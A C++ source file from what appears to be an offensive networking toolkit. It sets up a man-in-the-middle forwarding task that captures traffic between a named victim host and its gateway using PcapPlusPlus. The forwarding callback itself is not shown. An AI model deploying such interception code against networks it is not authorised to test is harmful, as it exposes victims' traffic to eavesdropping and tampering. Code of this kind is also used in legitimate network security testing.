//
// Created by dev on 6/28/25.
//

#include "mitm-packet-forwarding.hpp"

void ashk::tasks::MITMPacketForwarding::Exec_() {
  logger_.Log("start forwarding . . .\n");
  dev_ = pcpp::PcapLiveDeviceList::getInstance().getDeviceByIp(iface_ip_);
  if (dev_ == nullptr) {
    logger_.Log("couldn't find device\n");
    return;
  }
  if (!dev_->open()) {
    logger_.Log("couldn't open device");

  }
  pcpp::MacAddress iface_mac = dev_->getMacAddress();
  MITMForwardingCookie cookie;

  cookie.gateway_ip = gateway_ip_;
  cookie.victim_ip = victim_ip_;
  cookie.victim_mac = victim_mac_;
  cookie.gateway_mac = gateway_mac_;

  if (!capture_wrapper_.StartCapture(dev_, PacketReceiver::onPacketArrivesMITMForwarding, &cookie, last_task_id_))
    return;
  while (IsRunning()) {
    std::this_thread::sleep_for(std::chrono::seconds(1));
  }
  capture_wrapper_.StopCapture(dev_);
  End();
  logger_.Log("mitm forwarding stopped.\n");
}
ashk::tasks::MITMPacketForwarding::MITMPacketForwarding(pcpp::IPv4Address iface_ip, pcpp::IPv4Address victim_ip,
                                                        pcpp::IPv4Address gateway_ip, pcpp::MacAddress victim_mac,
                                                        pcpp::MacAddress gateway_mac, int last_task_id) : iface_ip_(
    iface_ip),
                                                                                                          victim_mac_(
                                                                                                              victim_mac),
                                                                                                          gateway_mac_(
                                                                                                              gateway_mac),
                                                                                                          victim_ip_(
                                                                                                              victim_ip),
                                                                                                          gateway_ip_(
                                                                                                              gateway_ip),
                                                                                                          Task(
                                                                                                              last_task_id) {

}
std::string ashk::tasks::MITMPacketForwarding::GetData(tasks_data_id data_id) {
  if (!extractable_data_.count(data_id))
    return "";
  switch (data_id) {
    default:return "";
  }
}

